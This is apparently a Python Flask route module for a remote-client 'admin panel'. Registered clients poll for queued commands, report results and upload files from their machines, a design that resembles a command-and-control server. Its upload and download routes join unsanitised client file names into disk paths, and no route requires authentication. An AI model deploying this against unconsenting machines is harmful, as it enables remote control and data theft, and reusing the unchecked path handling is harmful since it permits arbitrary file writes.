#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import json
import base64
from datetime import datetime
from flask import render_template, request, jsonify, send_file, abort
from flask_socketio import emit, join_room, leave_room
from typing import Optional, Dict, List, Any

def register_routes(app, socketio, client_handler, command_handler, logger):
    """Register routes for the admin panel
    
    Args:
        app (Flask): Flask application instance
        socketio (SocketIO): Socket.IO instance
        client_handler (ClientHandler): Client handler instance
        command_handler (CommandHandler): Command handler instance
        logger (logging.Logger): Logger instance
    """
    
    # Web Routes
    @app.route('/')
    def index():
        """Render the admin panel dashboard"""
        try:
            return render_template('index.html')
        except Exception as e:
            logger.error(f"Error rendering index page: {e}")
            return abort(500)

    @app.route('/api/clients', methods=['GET'])
    def get_clients():
        """Get all registered clients"""
        try:
            clients = client_handler.get_all_clients()
            return jsonify(clients), 200
        except Exception as e:
            logger.error(f"Error getting clients: {e}")
            return jsonify({'error': str(e)}), 500

    @app.route('/api/clients/<client_id>', methods=['GET'])
    def get_client(client_id: str):
        """Get specific client information
        
        Args:
            client_id: Client ID
        """
        try:
            client = client_handler.get_client(client_id)
            if not client:
                return jsonify({'error': 'Client not found'}), 404
            return jsonify(client), 200
        except Exception as e:
            logger.error(f"Error getting client {client_id}: {e}")
            return jsonify({'error': str(e)}), 500

    @app.route('/api/clients/<client_id>/commands', methods=['GET'])
    def get_commands(client_id: str):
        """Get command history for a client
        
        Args:
            client_id: Client ID
        """
        try:
            limit = request.args.get('limit', 50, type=int)
            if limit < 1 or limit > 1000:
                return jsonify({'error': 'Limit must be between 1 and 1000'}), 400
                
            commands = client_handler.get_command_history(client_id, limit)
            return jsonify(commands), 200
        except Exception as e:
            logger.error(f"Error getting commands for client {client_id}: {e}")
            return jsonify({'error': str(e)}), 500

    @app.route('/api/clients/<client_id>/commands', methods=['POST'])
    def add_command(client_id: str):
        """Add a command for a client
        
        Args:
            client_id: Client ID
        """
        try:
            data = request.get_json()
            if not data or 'command' not in data:
                return jsonify({'error': 'Invalid request: command required'}), 400
                
            if not client_handler.get_client(client_id):
                return jsonify({'error': 'Client not found'}), 404
                
            command_type = data['command']
            params = data.get('params', {})
            
            command_id = command_handler.process_command(client_id, command_type, params)
            if command_id is None:
                return jsonify({'error': 'Failed to process command'}), 500
                
            # Notify connected admins via Socket.IO
            socketio.emit('command_added', {
                'client_id': client_id,
                'command_id': command_id,
                'command': command_type,
                'params': params,
                'timestamp': datetime.now().isoformat()
            }, room=f'client_{client_id}')
            
            logger.info(f"Command {command_type} added for client {client_id} (ID: {command_id})")
            return jsonify({'command_id': command_id}), 201
        except Exception as e:
            logger.error(f"Error adding command for client {client_id}: {e}")
            return jsonify({'error': str(e)}), 500

    @app.route('/api/clients/<client_id>/files', methods=['GET'])
    def get_files(client_id: str):
        """Get files uploaded by a client
        
        Args:
            client_id: Client ID
        """
        try:
            files = client_handler.get_files(client_id)
            return jsonify(files), 200
        except Exception as e:
            logger.error(f"Error getting files for client {client_id}: {e}")
            return jsonify({'error': str(e)}), 500

    @app.route('/api/files/<int:file_id>', methods=['GET'])
    def download_file(file_id: int):
        """Download a file
        
        Args:
            file_id: File ID
        """
        try:
            file_info = client_handler.get_file_info(file_id)
            if not file_info:
                return jsonify({'error': 'File not found'}), 404
                
            client_id = file_info.get('client_id')
            file_name = file_info.get('file_name')
            file_path = os.path.join(
                os.path.dirname(os.path.dirname(__file__)),
                'files',
                client_id,
                file_name
            )
            
            if not os.path.exists(file_path):
                return jsonify({'error': 'File not found on server'}), 404
                
            return send_file(
                file_path,
                as_attachment=True,
                download_name=file_name,
                mimetype='application/octet-stream'
            )
        except Exception as e:
            logger.error(f"Error downloading file {file_id}: {e}")
            return jsonify({'error': str(e)}), 500

    # Socket.IO Events
    @socketio.on('connect')
    def handle_connect():
        """Handle admin connection"""
        logger.debug(f"Admin connected: {request.sid}")
        emit('connection_established', {'sid': request.sid})

    @socketio.on('disconnect')
    def handle_disconnect():
        """Handle admin disconnection"""
        logger.debug(f"Admin disconnected: {request.sid}")

    @socketio.on('join')
    def handle_join(data: Dict):
        """Join a room for a specific client
        
        Args:
            data: Room data with client_id
        """
        try:
            client_id = data.get('client_id')
            if not client_id:
                emit('error', {'message': 'Client ID required'})
                return
                
            room = f'client_{client_id}'
            join_room(room)
            logger.debug(f"Admin {request.sid} joined room: {room}")
            emit('joined', {'room': room})
        except Exception as e:
            logger.error(f"Error in join event: {e}")
            emit('error', {'message': str(e)})

    @socketio.on('leave')
    def handle_leave(data: Dict):
        """Leave a room for a specific client
        
        Args:
            data: Room data with client_id
        """
        try:
            client_id = data.get('client_id')
            if not client_id:
                emit('error', {'message': 'Client ID required'})
                return
                
            room = f'client_{client_id}'
            leave_room(room)
            logger.debug(f"Admin {request.sid} left room: {room}")
            emit('left', {'room': room})
        except Exception as e:
            logger.error(f"Error in leave event: {e}")
            emit('error', {'message': str(e)})

    # Client API Routes
    @app.route('/api/client/register', methods=['POST'])
    def register_client():
        """Register a new client"""
        try:
            data = request.get_json()
            if not data or 'id' not in data:
                return jsonify({'error': 'Invalid request: client ID required'}), 400
                
            client_id = client_handler.register_client(data)
            logger.info(f"Client registered: {client_id}")
            return jsonify({'client_id': client_id}), 201
        except Exception as e:
            logger.error(f"Error registering client: {e}")
            return jsonify({'error': str(e)}), 500

    @app.route('/api/client/heartbeat/<client_id>', methods=['POST'])
    def client_heartbeat(client_id: str):
        """Update client heartbeat
        
        Args:
            client_id: Client ID
        """
        try:
            success = client_handler.heartbeat(client_id)
            if not success:
                return jsonify({'error': 'Client not found'}), 404
                
            commands = client_handler.get_pending_commands(client_id)
            logger.debug(f"Heartbeat received from client {client_id}")
            return jsonify({'commands': commands}), 200
        except Exception as e:
            logger.error(f"Error processing heartbeat for client {client_id}: {e}")
            return jsonify({'error': str(e)}), 500

    @app.route('/api/client/command/<int:command_id>', methods=['POST'])
    def update_command(command_id: int):
        """Update command result
        
        Args:
            command_id: Command ID
        """
        try:
            data = request.get_json()
            if not data or 'status' not in data or 'result' not in data:
                return jsonify({'error': 'Invalid request: status and result required'}), 400
                
            success = client_handler.update_command_result(
                command_id,
                data['status'],
                data['result']
            )
            
            if not success:
                return jsonify({'error': 'Failed to update command'}), 400
                
            # Notify admins of command result
            command_info = client_handler.get_command_info(command_id)
            if command_info and 'client_id' in command_info:
                socketio.emit('command_result', {
                    'command_id': command_id,
                    'status': data['status'],
                    'result': data['result'],
                    'timestamp': datetime.now().isoformat()
                }, room=f'client_{command_info["client_id"]}')
                
            logger.info(f"Command {command_id} result updated: {data['status']}")
            return jsonify({'success': True}), 200
        except Exception as e:
            logger.error(f"Error updating command {command_id}: {e}")
            return jsonify({'error': str(e)}), 500

    @app.route('/api/client/file/<client_id>', methods=['POST'])
    def upload_file(client_id: str):
        """Upload a file from client
        
        Args:
            client_id: Client ID
        """
        try:
            data = request.get_json()
            if not data or 'file_data' not in data or 'file_name' not in data:
                return jsonify({'error': 'Invalid request: file_data and file_name required'}), 400
                
            if not client_handler.get_client(client_id):
                return jsonify({'error': 'Client not found'}), 404
                
            file_data = {
                'file_name': data['file_name'],
                'file_path': data.get('file_path', ''),
                'file_size': len(data['file_data']),
                'file_type': data.get('file_type', ''),
                'timestamp': datetime.now().isoformat()
            }
            
            # Save file to disk
            file_dir = os.path.join(os.path.dirname(os.path.dirname(__file__)), 'files', client_id)
            os.makedirs(file_dir, exist_ok=True)
            
            file_path = os.path.join(file_dir, data['file_name'])
            with open(file_path, 'wb') as f:
                f.write(base64.b64decode(data['file_data']))
            
            file_id = client_handler.add_file(client_id, file_data)
            if file_id is None:
                return jsonify({'error': 'Failed to add file'}), 500
                
            logger.info(f"File uploaded from client {client_id}: {data['file_name']} (ID: {file_id})")
            socketio.emit('file_uploaded', {
                'client_id': client_id,
                'file_id': file_id,
                'file_name': data['file_name']
            }, room=f'client_{client_id}')
            
            return jsonify({'file_id': file_id}), 201
        except Exception as e:
            logger.error(f"Error uploading file for client {client_id}: {e}")
            return jsonify({'error': str(e)}), 500

# Placeholder classes for reference (these should be implemented separately)
class ClientHandler:
    def get_all_clients(self) -> List[Dict]: pass
    def get_client(self, client_id: str) -> Optional[Dict]: pass
    def get_command_history(self, client_id: str, limit: int) -> List[Dict]: pass
    def get_pending_commands(self, client_id: str) -> List[Dict]: pass
    def register_client(self, data: Dict) -> str: pass
    def heartbeat(self, client_id: str) -> bool: pass
    def update_command_result(self, command_id: int, status: str, result: Dict) -> bool: pass
    def get_files(self, client_id: str) -> List[Dict]: pass
    def add_file(self, client_id: str, file_data: Dict) -> Optional[int]: pass
    def get_file_info(self, file_id: int) -> Optional[Dict]: pass
    def get_command_info(self, command_id: int) -> Optional[Dict]: pass

class CommandHandler:
    def process_command(self, client_id: str, command_type: str, params: Dict) -> Optional[str]: pass